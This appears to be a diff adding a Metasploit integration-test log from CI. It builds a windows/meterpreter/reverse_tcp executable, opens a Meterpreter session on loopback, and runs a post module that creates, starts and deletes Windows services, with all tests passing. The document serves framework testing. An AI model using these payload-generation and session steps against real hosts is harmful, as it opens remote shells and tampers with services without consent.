@@ -1,0 +1,45 @@
+use windows/meterpreter/reverse_tcp
+msf6 post(test/search) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20240307-3104-o0dauftxt
+msf6 payload(windows/meterpreter/reverse_tcp) > msf6 payload(windows/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20240307-3104-o0dauftxt
+msf6 payload(windows/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-8xbnfp.exe -f exe AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20240307-3104-uhc2tgtxt MeterpreterDebugBuild=true
+[*] Writing 73802 bytes to D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20240307-3104-8xbnfp.exe...
+msf6 payload(windows/meterpreter/reverse_tcp) > to_handler AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20240307-3104-uhc2tgtxt MeterpreterDebugBuild=true
+[*] Payload Handler Started as Job 7
+msf6 payload(windows/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6008 
+[*] Sending stage (232014 bytes) to 127.0.0.1
+[*] Meterpreter session 8 opened (127.0.0.1:6008 -> 127.0.0.1:50007) at 2024-03-07 09:40:11 +0000
+use test/services
+msf6 post(test/services) > run session=8 AddEntropy=true Verbose=true
+[*] Running against session 8
+[*] Session type is meterpreter and platform is windows
+[+] should start W32Time
+[+] should stop W32Time
+[+] should return status on a given service winmgmt
+[*] [should modify config on a given service] creating new service aePQCS
+[+] should modify config on a given service
+[+] should list services
+[*] [should start a disabled service] creating new service aMNjXF
+[*] [should start a disabled service] [aMNjXF] Service disabled attempting to set to manual
+[+] [should start a disabled service] [aMNjXF] Service started
+[+] should start a disabled service
+[*] [should return info on a given service winmgmt] Service details: {:starttype=>2, :display=>"Windows Management Instrumentation", :startname=>"localSystem", :path=>"C:\\Windows\\system32\\svchost.exe -k netsvcs -p", :logroup=>"", :interactive=>false, :dacl=>"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)", :status=>4}
+[+] should return info on a given service winmgmt
+[*] [should restart a started service W32Time] [W32Time] Service already running attempting to stop and restart
+[+] [should restart a started service W32Time] [W32Time] Service started
+[+] should restart a started service W32Time
+[+] should create a service testes
+[+] should return info on the newly-created service testes
+[+] should delete the new service testes
+[+] should raise a runtime exception if no access to service
+[+] should raise a runtime exception if services doesnt exist
+[*] Testing complete in 8.39 seconds
+[*] Passed: 13; Failed: 0; Skipped: 0
+[*] Post module execution completed
+msf6 post(test/services) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 8 closed.
+msf6 post(test/services) > Stopping all jobs...
